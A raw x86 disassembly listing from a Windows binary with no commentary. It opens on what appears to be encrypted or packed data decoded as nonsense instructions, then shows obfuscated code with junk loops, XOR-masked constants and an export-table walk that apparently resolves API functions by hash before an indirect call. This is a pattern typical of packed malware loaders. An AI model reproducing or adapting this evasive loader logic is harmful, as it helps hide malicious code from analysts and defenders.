  407eb4:	cli    
  407eb5:	pop    ebp
  407eb6:	dec    edx
  407eb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407eb8:	pop    es
  407eb9:	adc    ah,BYTE PTR [ebp+0x31d9f4f7]
  407ebf:	stc    
  407ec0:	xor    ch,ah
  407ec2:	xchg   ebx,eax
  407ec3:	into   
  407ec4:	loope  0x407eba
  407ec6:	pop    edi
  407ec7:	loop   0x407ece
  407ec9:	outs   dx,BYTE PTR ds:[esi]
  407eca:	xchg   esi,eax
  407ecb:	mov    esp,0xc01a249b
  407ed0:	dec    ebp
  407ed1:	mov    cl,0xb1
  407ed3:	hlt    
  407ed4:	adc    ebx,DWORD PTR [ecx+0x4863e39d]
  407eda:	jmp    0x43c6:0x8100c54b
  407ee1:	or     al,0xe5
  407ee3:	inc    esp
  407ee4:	jns    0x407e91
  407ee6:	iret   
  407ee7:	push   edx
  407ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ee9:	fst    DWORD PTR [ebx+0x30]
  407eec:	mov    ebx,0x70aa09fc
  407ef1:	adc    eax,DWORD PTR [eax-0xc]
  407ef4:	icebp  
  407ef5:	rcl    al,0xa1
  407ef8:	pop    ecx
  407ef9:	and    al,0x7c
  407efb:	mov    edx,ss
  407efd:	test   al,0xb0
  407eff:	dec    edi
  407f00:	sti    
  407f01:	dec    esp
  407f02:	sbb    edi,DWORD PTR [edx-0x28a172f1]
  407f08:	sbb    DWORD PTR [ebx],eax
  407f0a:	xor    eax,0x75c0ea84
  407f0f:	sbb    al,0xe1
  407f11:	arpl   WORD PTR [ecx-0x20c70686],sp
  407f17:	mov    esi,DWORD PTR [eax+0x21e51bb9]
  407f1d:	jl     0x407f5a
  407f1f:	cmp    DWORD PTR [esi+0x2d],esi
  407f22:	(bad)  
  407f23:	rol    BYTE PTR [ecx-0x79],1
  407f26:	outs   dx,BYTE PTR ds:[esi]
  407f27:	in     al,dx
  407f28:	and    eax,0xeecb46c7
  407f2d:	adc    DWORD PTR [ecx],esi
  407f2f:	fild   WORD PTR [edi+0x34]
  407f32:	aas    
  407f33:	stos   BYTE PTR es:[edi],al
  407f34:	popf   
  407f35:	cmp    esp,DWORD PTR [esi]
  407f37:	call   0x68b23e47
  407f3c:	dec    ebx
  407f3d:	inc    ecx
  407f3e:	inc    edi
  407f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f40:	mov    dl,0xe3
  407f42:	add    al,0x43
  407f44:	xor    edx,ecx
  407f46:	mov    BYTE PTR [eax],al
  407f48:	push   eax
  407f49:	jb     0x407ee9
  407f4b:	pop    esp
  407f4c:	push   eax
  407f4d:	adc    esp,edx
  407f4f:	(bad)  
  407f50:	repz mov al,0x8b
  407f53:	jo     0x407efb
  407f55:	sbb    DWORD PTR [esp+ecx*1],ebp
  407f58:	imul   edi,ebp,0xffffffe0
  407f5b:	or     DWORD PTR [edi+0x2288e3e2],edx
  407f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f62:	call   0x2639:0xa925df93
  407f69:	adc    al,0x1b
  407f6b:	enterw 0xa5c1,0xa4
  407f70:	clc    
  407f71:	ret    
  407f72:	retf   
  407f73:	cdq    
  407f74:	es cli 
  407f76:	fs mov edx,0x5311bea3
  407f7c:	int3   
  407f7d:	fisttp WORD PTR [edi+0x35]
  407f80:	loop   0x407f3c
  407f82:	mov    al,0xff
  407f84:	cmp    ecx,DWORD PTR gs:[esi+0xc]
  407f88:	xchg   ebx,eax
  407f89:	retf   0xc34c
  407f8c:	icebp  
  407f8d:	push   esp
  407f8e:	cmp    ecx,DWORD PTR [edx-0x2a]
  407f91:	pop    es
  407f92:	sub    DWORD PTR [edx],edx
  407f94:	in     eax,0x28
  407f96:	test   eax,0x3985e6f3
  407f9b:	cld    
  407f9c:	lods   eax,DWORD PTR ds:[esi]
  407f9d:	inc    ecx
  407f9e:	jmp    0x40801d
  407fa0:	lds    esi,FWORD PTR [ecx-0x3f]
  407fa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fa4:	js     0x407fcf
  407fa6:	lahf   
  407fa7:	sbb    eax,0x7de6bdcf
  407fac:	cld    
  407fad:	leave  
  407fae:	mov    dh,0x7d
  407fb0:	and    ah,BYTE PTR [eax-0x47f1e92a]
  407fb6:	aaa    
  407fb7:	ins    BYTE PTR es:[edi],dx
  407fb8:	aaa    
  407fb9:	test   al,0x54
  407fbb:	jno    0x40801b
  407fbd:	dec    ebx
  407fbe:	ja     0x407f74
  407fc0:	xor    eax,0x60b28810
  407fc5:	mov    al,0xa0
  407fc7:	leave  
  407fc8:	lahf   
  407fc9:	gs scas eax,DWORD PTR es:[edi]
  407fcb:	call   0xa718b5d7
  407fd0:	mov    edx,0x8acc85a7
  407fd5:	jmp    0x8298f241
  407fda:	mov    DWORD PTR [ebp+0x5],ebp
  407fdd:	lods   eax,DWORD PTR ds:[esi]
  407fde:	ret    0xfdd1
  407fe1:	ins    BYTE PTR es:[edi],dx
  407fe2:	and    DWORD PTR [ebp+0x70],0xffffff86
  407fe6:	push   cs
  407fe7:	sbb    edx,ecx
  407fe9:	test   dl,bh
  407feb:	xor    al,0x6e
  407fed:	xor    eax,0x2d67536d
  407ff2:	ja     0x408051
  407ff4:	push   edx
  407ff5:	lods   eax,DWORD PTR ds:[esi]
  407ff6:	jno    0x407fb8
  407ff8:	xchg   esi,eax
  407ff9:	js     0x407fa0
  407ffb:	outs   dx,BYTE PTR ds:[esi]
  407ffc:	pop    ecx
  407ffd:	dec    edx
  407ffe:	fwait
  407fff:	jle    0x40805a
  408001:	xchg   edx,eax
  408002:	fmul   st(0),st
  408004:	pop    esp
  408005:	and    eax,0x1cba66d6
  40800a:	dec    esp
  40800b:	sbb    dh,BYTE PTR [esi+0x35362adf]
  408011:	push   es
  408012:	push   es
  408013:	add    eax,0xc6c1480c
  408018:	inc    edi
  408019:	leave  
  40801a:	(bad)  
  40801c:	xor    DWORD PTR [ebx+0x41],ebx
  40801f:	adc    bl,BYTE PTR [esi+0x1c]
  408022:	jle    0x408004
  408024:	popa   
  408025:	jne    0x408032
  408027:	inc    edx
  408028:	xchg   edi,eax
  408029:	rcr    bl,1
  40802b:	jge    0x408084
  40802d:	cmc    
  40802e:	xchg   ebx,eax
  40802f:	xor    al,0x77
  408031:	retf   0xcb31
  408034:	mov    ebx,0x34567583
  408039:	test   BYTE PTR [esi],0x5d
  40803c:	in     eax,0xff
  40803e:	fnstsw WORD PTR [edi]
  408040:	jecxz  0x408039
  408042:	in     al,0xd3
  408044:	jnp    0x407fdf
  408046:	jne    0x40806b
  408048:	in     al,0xe2
  40804a:	call   0x600c39c
  40804f:	inc    edx
  408050:	jge    0x407fe6
  408052:	sti    
  408053:	into   
  408054:	fsub   DWORD PTR [ebp-0x7f]
  408057:	add    BYTE PTR [edx-0x22],bl
  40805a:	loope  0x4080a7
  40805c:	sub    BYTE PTR [eax],ah
  40805e:	inc    edi
  40805f:	jle    0x408049
  408061:	add    BYTE PTR [ebx],dh
  408063:	outs   dx,BYTE PTR ds:[esi]
  408064:	jb     0x4080d7
  408066:	aam    0x65
  408068:	adc    DWORD PTR [ebx-0x167aeee4],ecx
  40806e:	mov    cl,0x19
  408070:	rol    BYTE PTR [ebp-0x52],cl
  408073:	add    ecx,eax
  408075:	add    DWORD PTR [edx-0x7f],0x74d96d3f
  40807c:	js     0x4080e4
  40807e:	push   esi
  40807f:	mov    eax,ds:0x50186546
  408084:	pop    esp
  408085:	fidivr DWORD PTR [ebp+0x21646ea5]
  40808b:	sar    BYTE PTR [eax+0x1e31a882],cl
  408091:	pop    ds
  408092:	loopne 0x4080ee
  408094:	ret    
  408095:	mov    bh,0x56
  408097:	cwde   
  408098:	sahf   
  408099:	push   ss
  40809a:	sbb    al,0x51
  40809c:	jo     0x408061
  40809e:	xor    cl,BYTE PTR [edx+0x25]
  4080a1:	lea    ebp,[ebx]
  4080a3:	xchg   ebx,eax
  4080a4:	fnsave [ebx+0x3dcaaa82]
  4080aa:	push   ss
  4080ab:	(bad)  
  4080ac:	jo     0x40811e
  4080ae:	jg     0x408050
  4080b0:	cmc    
  4080b1:	xchg   esp,eax
  4080b2:	push   cs
  4080b3:	stos   BYTE PTR es:[edi],al
  4080b4:	pop    ss
  4080b5:	jle    0x4080a6
  4080b7:	sub    BYTE PTR [esi-0x54bc3847],dl
  4080bd:	loop   0x408082
  4080bf:	push   0xc81fa3bf
  4080c4:	inc    esp
  4080c5:	retf   
  4080c6:	loope  0x4080d7
  4080c8:	(bad)  
  4080ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080cb:	(bad)  
  4080cc:	and    ecx,DWORD PTR [eax+0x70]
  4080cf:	ss pop edi
  4080d1:	and    DWORD PTR [ebx+ebx*2-0x6b],eax
  4080d5:	sub    bl,BYTE PTR [esi+0x74af2042]
  4080db:	add    BYTE PTR [edx-0x5c],bh
  4080de:	mov    bh,0x71
  4080e0:	inc    edx
  4080e1:	aad    0xe3
  4080e3:	loopne 0x408116
  4080e5:	xlat   BYTE PTR ds:[ebx]
  4080e6:	push   edx
  4080e7:	sub    ecx,esi
  4080e9:	or     eax,0xbccace11
  4080ee:	scas   eax,DWORD PTR es:[edi]
  4080ef:	test   al,0x88
  4080f1:	xchg   edi,eax
  4080f2:	dec    eax
  4080f3:	std    
  4080f4:	scas   al,BYTE PTR es:[edi]
  4080f5:	xor    BYTE PTR [edi+0x1b],cl
  4080f8:	xchg   ebp,eax
  4080f9:	out    dx,al
  4080fa:	daa    
  4080fb:	les    edx,FWORD PTR [ecx+0x2d7f8551]
  408101:	call   0xe87e:0x4c3a5caf
  408108:	cdq    
  408109:	mov    dh,dh
  40810b:	jecxz  0x40814e
  40810d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40810e:	cs jmp 0x4914:0x983149d
  408116:	sub    al,0x84
  408118:	out    0x99,eax
  40811a:	outs   dx,BYTE PTR ds:[esi]
  40811b:	mov    cl,BYTE PTR [eax-0x72]
  40811e:	dec    edi
  40811f:	call   0x36e2cbc4
  408124:	inc    ebx
  408125:	sub    BYTE PTR [edi],bh
  408127:	cmp    eax,0x8432d5cc
  40812c:	add    esi,ebp
  40812e:	sub    DWORD PTR [ecx+0x67],esp
  408131:	jp     0x408129
  408133:	cmp    eax,0x709f2262
  408138:	outs   dx,BYTE PTR ds:[esi]
  408139:	cmp    ah,cl
  40813b:	sub    al,0xab
  40813d:	or     ecx,DWORD PTR [edx+0x3f]
  408140:	and    eax,ebx
  408142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408143:	and    DWORD PTR [ebx+0x1b],0x2a0f157
  40814a:	out    dx,eax
  40814b:	xor    dh,BYTE PTR [ebp-0x6]
  40814e:	xor    dh,bh
  408150:	push   ecx
  408151:	xchg   DWORD PTR [esi+esi*4+0x763c044f],eax
  408158:	jl     0x408195
  40815a:	pop    edi
  40815b:	and    cl,BYTE PTR [ecx-0x6]
  40815e:	dec    esp
  40815f:	inc    ebx
  408160:	xchg   edi,eax
  408161:	outs   dx,DWORD PTR ds:[esi]
  408162:	sbb    BYTE PTR [ecx-0x68],cl
  408165:	sub    DWORD PTR [eax+0x3e],ecx
  408168:	mov    eax,0x3cfeb603
  40816d:	rol    DWORD PTR [ebx+0x6],0xec
  408171:	into   
  408172:	aad    0x72
  408174:	data16 mov bh,0x45
  408177:	outs   dx,DWORD PTR ds:[esi]
  408178:	outs   dx,BYTE PTR ds:[esi]
  408179:	loope  0x408114
  40817b:	bound  edx,QWORD PTR [ecx-0x33]
  40817e:	xchg   esp,eax
  40817f:	cld    
  408180:	xchg   ecx,eax
  408181:	mov    cl,0x24
  408183:	pop    edi
  408184:	out    dx,al
  408185:	cmc    
  408186:	and    ecx,DWORD PTR [edi*1+0x29adfe65]
  40818d:	and    edi,DWORD PTR [esi]
  40818f:	sar    BYTE PTR [ecx],0x64
  408192:	lods   al,BYTE PTR ss:[esi]
  408194:	std    
  408195:	mov    ds:0xe65d3e35,eax
  40819a:	pop    ss
  40819b:	or     eax,0x3d31ce87
  4081a0:	sbb    al,0x80
  4081a2:	inc    edx
  4081a3:	add    BYTE PTR [edi+0x155c],bh
  4081a9:	sub    edx,edi
  4081ab:	and    DWORD PTR ds:0x42901c,0x60c1
  4081b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4081b8:	xor    ecx,ebx
  4081ba:	and    DWORD PTR ds:0x42b014,0x0
  4081c4:	mov    esi,DWORD PTR ds:0x42b014
  4081ca:	inc    esi
  4081cb:	mov    DWORD PTR ds:0x42b014,esi
  4081d1:	cmp    DWORD PTR ds:0x42b014,0x10
  4081d8:	jne    0x4081e9
  4081de:	push   0x423502
  4081e3:	call   DWORD PTR ds:0x424044
  4081e9:	cmp    DWORD PTR ds:0x42b014,0xf
  4081f0:	jne    0x408203
  4081f6:	mov    esi,DWORD PTR ds:0x42b014
  4081fc:	inc    esi
  4081fd:	mov    DWORD PTR ds:0x42b014,esi
  408203:	cmp    DWORD PTR ds:0x42b014,0x1b
  40820a:	jb     0x4081c4
  408210:	add    ecx,eax
  408212:	sbb    esi,0x766b
  408218:	mov    DWORD PTR [ebp-0x8],ecx
  40821b:	and    esi,0x21f
  408221:	mov    ecx,DWORD PTR [ebp-0x14]
  408224:	mov    DWORD PTR ds:0x42b000,0x19
  40822e:	cmp    DWORD PTR ds:0x42b000,0x0
  408235:	je     0x40828f
  40823b:	cmp    DWORD PTR ds:0x42b000,0x4
  408242:	jne    0x40825b
  408248:	push   DWORD PTR [ebp-0x1c]
  40824b:	push   0x429018
  408250:	push   0x42376e
  408255:	call   DWORD PTR ds:0x424048
  40825b:	cmp    DWORD PTR ds:0x42b000,0x5
  408262:	jne    0x408275
  408268:	mov    esi,DWORD PTR ds:0x42b000
  40826e:	dec    esi
  40826f:	mov    DWORD PTR ds:0x42b000,esi
  408275:	xor    esi,esi
  408277:	add    esi,DWORD PTR ds:0x42b000
  40827d:	dec    esi
  40827e:	mov    DWORD PTR ds:0x42b000,esi
  408284:	jmp    0x40822e
  408289:	and    esi,0x686c
  40828f:	xor    ecx,ebx
  408291:	add    ecx,eax
  408293:	mov    DWORD PTR [ebp-0x24],ecx
  408296:	adc    esi,ecx
  408298:	mov    ecx,DWORD PTR [ebp-0x4]
  40829b:	and    DWORD PTR ds:0x428014,0x0
  4082a5:	jmp    0x4082b7
  4082aa:	mov    esi,DWORD PTR ds:0x428014
  4082b0:	inc    esi
  4082b1:	mov    DWORD PTR ds:0x428014,esi
  4082b7:	cmp    DWORD PTR ds:0x428014,0x14
  4082be:	jae    0x4082ea
  4082c4:	cmp    DWORD PTR ds:0x428014,0x1d
  4082cb:	jne    0x4082df
  4082d1:	push   0x42b01c
  4082d6:	push   DWORD PTR [ebp-0xc]
  4082d9:	call   DWORD PTR ds:0x424014
  4082df:	jmp    0x4082aa
  4082e4:	xor    DWORD PTR ds:0x428018,ecx
  4082ea:	xor    ecx,ebx
  4082ec:	add    ecx,eax
  4082ee:	add    DWORD PTR ds:0x428004,edx
  4082f4:	mov    DWORD PTR [ebp-0x30],ecx
  4082f7:	adc    DWORD PTR ds:0x42b01c,edi
  4082fd:	mov    esi,DWORD PTR [ebp-0x4]
  408300:	xor    DWORD PTR ds:0x42800c,0x2f0f
  40830a:	xor    esi,ebx
  40830c:	and    DWORD PTR ds:0x429018,0x0
  408316:	mov    ecx,DWORD PTR ds:0x429018
  40831c:	inc    ecx
  40831d:	mov    DWORD PTR ds:0x429018,ecx
  408323:	cmp    DWORD PTR ds:0x429018,0x13
  40832a:	jne    0x408358
  408330:	push   DWORD PTR [ebp-0x18]
  408333:	push   0x42b018
  408338:	push   0x8bc1
  40833d:	push   0x42a018
  408342:	push   0x81c2
  408347:	push   DWORD PTR [ebp-0x18]
  40834a:	push   0x8630
  40834f:	push   DWORD PTR [ebp-0x28]
  408352:	call   DWORD PTR ds:0x424018
  408358:	cmp    DWORD PTR ds:0x429018,0x10
  40835f:	jb     0x408316
  408365:	movzx  ecx,WORD PTR ds:0x429008
  40836c:	sub    ecx,DWORD PTR ds:0x42a010
  408372:	mov    DWORD PTR ds:0x429008,ecx
  408378:	add    esi,eax
  40837a:	mov    ecx,DWORD PTR [ebp-0x24]
  40837d:	sub    ecx,eax
  40837f:	lea    edx,[esi-0x3272db]
  408385:	xor    DWORD PTR ds:0x428008,0x428000
  40838f:	xor    ecx,ebx
  408391:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40839b:	xor    edx,ebx
  40839d:	cmp    edx,ecx
  40839f:	mov    DWORD PTR ds:0x428000,0x76f
  4083a9:	je     0x408631
  4083af:	xor    DWORD PTR ds:0x42c010,edx
  4083b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4083b8:	xor    ecx,ebx
  4083ba:	or     DWORD PTR ds:0x429014,0x42a01c
  4083c4:	add    ecx,eax
  4083c6:	cmp    esi,ecx
  4083c8:	mov    DWORD PTR ds:0x42a01c,0x739d
  4083d2:	jne    0x40860e
  4083d8:	add    DWORD PTR ds:0x42a00c,0x429004
  4083e2:	push   DWORD PTR [ebp+0x8]
  4083e5:	call   0x408a39
  4083ea:	mov    DWORD PTR [ebp-0x18],eax
  4083ed:	mov    eax,DWORD PTR [ebp-0x4]
  4083f0:	mov    DWORD PTR ds:0x42c00c,0x1d
  4083fa:	cmp    DWORD PTR ds:0x42c00c,0x0
  408401:	je     0x408435
  408407:	cmp    DWORD PTR ds:0x42c00c,0x21
  40840e:	jne    0x40841d
  408414:	push   DWORD PTR [ebp-0xc]
  408417:	call   DWORD PTR ds:0x42401c
  40841d:	mov    edi,DWORD PTR ds:0x42c00c
  408423:	dec    edi
  408424:	mov    DWORD PTR ds:0x42c00c,edi
  40842a:	jmp    0x4083fa
  40842f:	adc    ecx,DWORD PTR ds:0x428008
  408435:	mov    ecx,DWORD PTR [ebp-0x18]
  408438:	and    DWORD PTR ds:0x42b01c,0x0
  408442:	mov    edi,DWORD PTR ds:0x42b01c
  408448:	inc    edi
  408449:	mov    DWORD PTR ds:0x42b01c,edi
  40844f:	cmp    DWORD PTR ds:0x42b01c,0x23
  408456:	jne    0x408468
  40845c:	push   DWORD PTR [ebp-0x14]
  40845f:	push   DWORD PTR [ebp-0x28]
  408462:	call   DWORD PTR ds:0x424020
  408468:	cmp    DWORD PTR ds:0x42b01c,0x19
  40846f:	jb     0x408442
  408475:	xor    eax,ebx
  408477:	add    DWORD PTR ds:0x429018,0x397c
  408481:	mov    edi,0x3272db
  408486:	sub    DWORD PTR ds:0x428020,0x386b
  408490:	add    eax,edi
  408492:	mov    DWORD PTR ds:0x42900c,0x67dc
  40849c:	cmp    ecx,eax
  40849e:	mov    DWORD PTR ds:0x42c00c,0x661b
  4084a8:	je     0x4086a1
  4084ae:	push   DWORD PTR [ebp-0x18]
  4084b1:	sub    DWORD PTR ds:0x42800c,0x42a014
  4084bb:	push   DWORD PTR [ebp+0x8]
  4084be:	and    DWORD PTR ds:0x42b000,0x429010
  4084c8:	call   0x419246
  4084cd:	sub    ecx,DWORD PTR ds:0x42a00c
  4084d3:	mov    DWORD PTR [ebp-0x18],eax
  4084d6:	xor    eax,eax
  4084d8:	xor    eax,DWORD PTR ds:0x42a01c
  4084de:	xor    DWORD PTR ds:0x428018,eax
  4084e4:	mov    eax,DWORD PTR [ebp-0x4]
  4084e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4084ea:	xor    eax,ebx
  4084ec:	add    eax,edi
  4084ee:	cmp    ecx,eax
  4084f0:	je     0x4086a1
  4084f6:	mov    ecx,DWORD PTR ds:0x429010
  4084fc:	add    DWORD PTR ds:0x42a010,ecx
  408502:	mov    eax,DWORD PTR [ebp-0x18]
  408505:	and    DWORD PTR ds:0x42a008,0x0
  40850f:	jmp    0x408521
  408514:	mov    ecx,DWORD PTR ds:0x42a008
  40851a:	inc    ecx
  40851b:	mov    DWORD PTR ds:0x42a008,ecx
  408521:	cmp    DWORD PTR ds:0x42a008,0x14
  408528:	jae    0x4085ac
  40852e:	cmp    DWORD PTR ds:0x42a008,0x1f
  408535:	jne    0x408563
  40853b:	push   0x42b010
  408540:	push   DWORD PTR [ebp-0x10]
  408543:	push   0x4f72
  408548:	push   0x42900c
  40854d:	push   DWORD PTR [ebp-0x24]
  408550:	push   0x42368e
  408555:	push   DWORD PTR [ebp-0x1c]
  408558:	push   0x3544
  40855d:	call   DWORD PTR ds:0x424024
  408563:	jmp    0x408514
  408568:	and    DWORD PTR ds:0x428020,0x0
  408572:	mov    ecx,DWORD PTR ds:0x428020
  408578:	inc    ecx
  408579:	mov    DWORD PTR ds:0x428020,ecx
  40857f:	cmp    DWORD PTR ds:0x428020,0x1a
  408586:	jne    0x40859f
  40858c:	push   DWORD PTR [ebp-0x1c]
  40858f:	push   0x561b
  408594:	push   0x3276
  408599:	call   DWORD PTR ds:0x424028
  40859f:	cmp    DWORD PTR ds:0x428020,0x17
  4085a6:	jb     0x408572
  4085ac:	mov    eax,DWORD PTR [eax+0x18]
  4085af:	mov    DWORD PTR [ebp-0x24],eax
  4085b2:	xor    eax,eax
  4085b4:	mov    eax,DWORD PTR [ebp-0x18]
  4085b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4085ba:	add    DWORD PTR ds:0x42901c,0x480
  4085c4:	add    ecx,DWORD PTR [eax+0x20]
  4085c7:	mov    DWORD PTR [ebp-0x2c],ecx
  4085ca:	sub    DWORD PTR ds:0x42c00c,ebx
  4085d0:	mov    eax,DWORD PTR [ebp-0x18]
  4085d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4085d6:	add    DWORD PTR ds:0x42a004,0x42a01c
  4085e0:	add    ecx,DWORD PTR [eax+0x24]
  4085e3:	mov    DWORD PTR [ebp-0x34],ecx
  4085e6:	inc    ecx
  4085e7:	mov    eax,DWORD PTR [ebp-0x18]
  4085ea:	sub    DWORD PTR ds:0x42b010,0x20b8
  4085f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4085f7:	or     DWORD PTR ds:0x42a010,0x1874
  408601:	add    ecx,DWORD PTR [eax+0x1c]
  408604:	mov    eax,edi
  408606:	mov    DWORD PTR [ebp-0x18],ecx
  408609:	jmp    0x408669
  40860e:	mov    ecx,DWORD PTR [ebp-0x2c]
  408611:	mov    edx,DWORD PTR [ebp+0x8]
  408614:	add    edx,DWORD PTR [ecx+esi*4]
  408617:	mov    DWORD PTR [ebp-0x28],edx
  40861a:	mov    ecx,DWORD PTR [ebp-0x4]
  40861d:	mov    edx,DWORD PTR [ebp-0x28]
  408620:	xor    ecx,ebx
  408622:	add    ecx,eax
  408624:	cmp    edx,ecx
  408626:	je     0x408669
  40862c:	jmp    0x408655
  408631:	mov    ecx,DWORD PTR [ebp-0x4]
  408634:	mov    edx,DWORD PTR [ebp-0x8]
  408637:	xor    ecx,ebx
  408639:	add    ecx,eax
  40863b:	cmp    edx,ecx
  40863d:	je     0x4086ad
  408643:	mov    ecx,DWORD PTR [ebp-0x4]
  408646:	mov    edx,DWORD PTR [ebp-0x30]
  408649:	xor    ecx,ebx
  40864b:	add    ecx,eax
  40864d:	cmp    edx,ecx
  40864f:	je     0x4086bc
  408655:	lea    eax,[ebp-0x8]
  408658:	push   eax
  408659:	push   DWORD PTR [ebp-0x28]
  40865c:	push   DWORD PTR [ebp+0xc]
  40865f:	call   0x419e00
  408664:	mov    eax,0x3272db
  408669:	mov    ecx,DWORD PTR [ebp-0x4]
  40866c:	mov    edx,DWORD PTR [ebp-0x8]
  40866f:	xor    ecx,ebx
  408671:	add    ecx,eax
  408673:	cmp    edx,ecx
  408675:	je     0x408690
  40867b:	mov    ecx,DWORD PTR [ebp-0x34]
  40867e:	movzx  ecx,WORD PTR [ecx+esi*2]
  408682:	mov    edx,DWORD PTR [ebp-0x18]
  408685:	mov    ecx,DWORD PTR [edx+ecx*4]
  408688:	mov    DWORD PTR [ebp-0x38],ecx
  40868b:	jmp    0x408631
  408690:	mov    ecx,DWORD PTR [ebp-0x14]
  408693:	xor    ecx,ebx
  408695:	lea    esi,[esi+ecx*1+0x3272db]
  40869c:	jmp    0x40837a
  4086a1:	mov    eax,DWORD PTR [ebp-0x4]
  4086a4:	xor    eax,ebx
  4086a6:	add    eax,edi
  4086a8:	jmp    0x408820
  4086ad:	mov    eax,DWORD PTR [ebp-0x4]
  4086b0:	xor    eax,ebx
  4086b2:	add    eax,0x3272db
  4086b7:	jmp    0x408820
  4086bc:	mov    ecx,DWORD PTR [ebp-0x38]
  4086bf:	add    ecx,DWORD PTR [ebp+0x8]
  4086c2:	mov    DWORD PTR [ebp-0x10],ecx
  4086c5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4086c8:	test   ecx,ecx
  4086ca:	je     0x4087ab
  4086d0:	mov    DWORD PTR [ebp-0x20],0x0
  4086d7:	push   0x3
  4086d9:	xor    edx,edx
  4086db:	pop    edx
  4086dc:	add    edx,0x8
  4086df:	push   edx
  4086e0:	pop    ecx
  4086e1:	push   0x6
  4086e3:	dec    ecx
  4086e4:	pop    ebx
  4086e5:	dec    ebx
  4086e6:	xchg   ebx,ecx
  4086e8:	sub    ebx,ecx
  4086ea:	xchg   ebx,ecx
  4086ec:	dec    ecx
  4086ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f0:	imul   eax,ecx
  4086f3:	sub    esp,eax
  4086f5:	mov    DWORD PTR [ebp-0x20],esp
  4086f8:	mov    eax,DWORD PTR [ebp-0x4]
  4086fb:	mov    ecx,0x7510893
  408700:	xor    eax,ecx
  408702:	mov    edx,0x3272db
  408707:	add    eax,edx
  408709:	mov    DWORD PTR [ebp+0x8],eax
  40870c:	mov    eax,DWORD PTR [ebp-0x14]
  40870f:	xor    eax,ecx
  408711:	add    eax,edx
  408713:	mov    edx,DWORD PTR [ebp+0x14]
  408716:	imul   eax,DWORD PTR [edx]
  408719:	mov    edx,DWORD PTR [ebp-0x4]
  40871c:	xor    edx,ecx
  40871e:	mov    ecx,DWORD PTR [ebp+0x8]
  408721:	lea    ecx,[edx+ecx*1+0x3272db]
  408728:	cmp    ecx,eax
  40872a:	je     0x4087a1
  408730:	mov    edi,DWORD PTR [ebp-0x14]
  408733:	mov    eax,DWORD PTR [ebp+0x8]
  408736:	mov    edx,DWORD PTR [ebp+0x14]
  408739:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40873d:	mov    ecx,0x7510893
  408742:	xor    edx,edx
  408744:	xor    edi,ecx
  408746:	mov    esi,0x3272db
  40874b:	add    edi,esi
  40874d:	div    edi
  40874f:	mov    edx,DWORD PTR [ebp-0x4]
  408752:	xor    edx,ecx
  408754:	lea    eax,[edx+eax*1+0x3272db]
  40875b:	mov    edx,DWORD PTR [ebp+0x8]
  40875e:	mov    edi,DWORD PTR [ebp-0x20]
  408761:	mov    DWORD PTR [edi+edx*4],eax
  408764:	mov    eax,DWORD PTR [ebp-0x14]
  408767:	mov    edx,DWORD PTR [ebp+0x8]
  40876a:	xor    eax,ecx
  40876c:	lea    eax,[eax+edx*1+0x3272db]
  408773:	mov    DWORD PTR [ebp+0x8],eax
  408776:	mov    eax,DWORD PTR [ebp-0x14]
  408779:	mov    edx,DWORD PTR [ebp+0x14]
  40877c:	xor    eax,ecx
  40877e:	add    eax,esi
  408780:	imul   eax,DWORD PTR [edx]
  408783:	mov    edx,DWORD PTR [ebp-0x4]
  408786:	xor    edx,ecx
  408788:	mov    ecx,DWORD PTR [ebp+0x8]
  40878b:	lea    ecx,[edx+ecx*1+0x3272db]
  408792:	cmp    ecx,eax
  408794:	jne    0x408730
  40879a:	mov    eax,esi
  40879c:	jmp    0x4087a6
  4087a1:	mov    eax,0x3272db
  4087a6:	mov    ebx,0x7510893
  4087ab:	mov    ecx,DWORD PTR [ebp-0x4]
  4087ae:	xor    ecx,ebx
  4087b0:	add    ecx,eax
  4087b2:	mov    DWORD PTR [ebp-0xc],ecx
  4087b5:	mov    ebx,0x3874
  4087ba:	add    ebx,0x2342
  4087c0:	xchg   ebx,esi
  4087c2:	xor    ebx,ebx
  4087c4:	push   esi
  4087c5:	mov    esi,ebx
  4087c7:	pop    ebx
  4087c8:	mov    edx,esi
  4087ca:	add    ebx,0x1002
  4087d0:	lea    eax,[ebp-0x10]
  4087d3:	add    edx,eax
  4087d5:	add    edx,0x5
  4087d8:	push   edx
  4087d9:	inc    esi
  4087da:	pop    ecx
  4087db:	dec    ecx
  4087dc:	xchg   ecx,eax
  4087dd:	dec    eax
  4087de:	xchg   ecx,eax
  4087df:	dec    ecx
  4087e0:	xchg   ecx,edx
  4087e2:	dec    edx
  4087e3:	push   edx
  4087e4:	mov    edx,ebx
  4087e6:	pop    ebx
  4087e7:	dec    ebx
  4087e8:	call   DWORD PTR [ebx]
  4087ea:	cmp    DWORD PTR [ebp+0x10],esi
  4087ed:	je     0x40880c
  4087f3:	xchg   edx,eax
  4087f4:	push   0xb
  4087f6:	pop    ecx
  4087f7:	push   0x4
  4087f9:	pop    ebx
  4087fa:	inc    ebx
  4087fb:	xchg   ebx,ecx
  4087fd:	sub    ebx,ecx
  4087ff:	xchg   ebx,ecx
  408801:	dec    ecx
  408802:	dec    ecx
  408803:	mov    eax,DWORD PTR [ebp-0x1c]
  408806:	imul   eax,ecx
  408809:	add    esp,eax
  40880b:	xchg   edx,eax
  40880c:	push   eax
  40880d:	xor    ebx,ebx
  40880f:	mov    edx,esp
  408811:	dec    edx
  408812:	inc    ebx
  408813:	add    ebx,DWORD PTR [edx+ebx*1]
  408816:	dec    ebx
  408817:	xor    edx,edx
  408819:	add    DWORD PTR [ebp-0xc],ebx
  40881c:	pop    ebx
  40881d:	mov    eax,DWORD PTR [ebp-0xc]
